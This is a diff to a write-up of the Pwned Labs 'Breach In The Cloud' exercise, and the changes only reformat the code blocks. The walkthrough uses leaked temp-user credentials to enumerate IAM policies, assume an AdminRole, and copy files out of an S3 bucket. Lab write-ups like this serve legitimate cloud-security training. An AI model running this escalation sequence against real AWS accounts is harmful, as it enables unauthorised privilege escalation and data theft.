@@ -124,7 +124,7 @@ After analyzing the log files, Let's try to retrace the steps and get access.
 
 I configured the `aws-cli` as per the credentials given in the starting point of the lab to have access as the `temp-user`.
 
-```
+```bash
 $ aws sts get-caller-identity
 ```
 
@@ -132,7 +132,7 @@ $ aws sts get-caller-identity
 
 Now let's check what policies are attached as a temp-user.
 
-```
+```bash
 $ aws iam list-user-policies --user-name temp-user
 ```
 
@@ -140,7 +140,7 @@ $ aws iam list-user-policies --user-name temp-user
 
 Let's check the policy to see the actions we are able to make as a temp-user.
 
-```
+```bash
 $ aws iam get-user-policy --user-name temp-user --policy-name test-temp-user
 ```
 
@@ -148,19 +148,20 @@ $ aws iam get-user-policy --user-name temp-user --policy-name test-temp-user
 
 ## Assuming the Role
 
-```
+```bash
 $ aws sts assume-role --role-arn arn:aws:iam::107513503799:role/AdminRole --role-session-name hellosesssion
 ```
 
 <figure><img src="/assets/pwnedlabs/Breach-In-The-Cloud/9.png" alt="Details for the assumed role created."></figure>
 
-Exported the values as environment variables to login into the AdminRole.
+Exported the values as environment variables to login into the `AdminRole`.
 
-<figure><img src="/assets/pwnedlabs/Breach-In-The-Cloud/10.png" alt="Exporting environment variables"><figure>
+
+<figure><img src="/assets/pwnedlabs/Breach-In-The-Cloud/10.png" alt="Exporting environment variables."></figure>
 
 Let's run `get-caller-identity` to check our role again.
 
-```terminal
+```bash
 $ aws sts get-caller-identity
 ```
 
@@ -168,7 +169,7 @@ $ aws sts get-caller-identity
 
 We saw that there was a bucket named `emergency-data-recovery`. Let's list contents of that bucket.
 
-```
+```bash
 $ aws s3 ls s3://emergency-data-recovery
 ```
 
@@ -176,7 +177,7 @@ $ aws s3 ls s3://emergency-data-recovery
 
 Copy paste the content to our local machine.
 
-```
+```bash
 $ aws s3 cp s3://emergency-data-recovery/emergency.txt .
 
 $ aws s3 cp s3://emergency-data-recovery/message.txt .
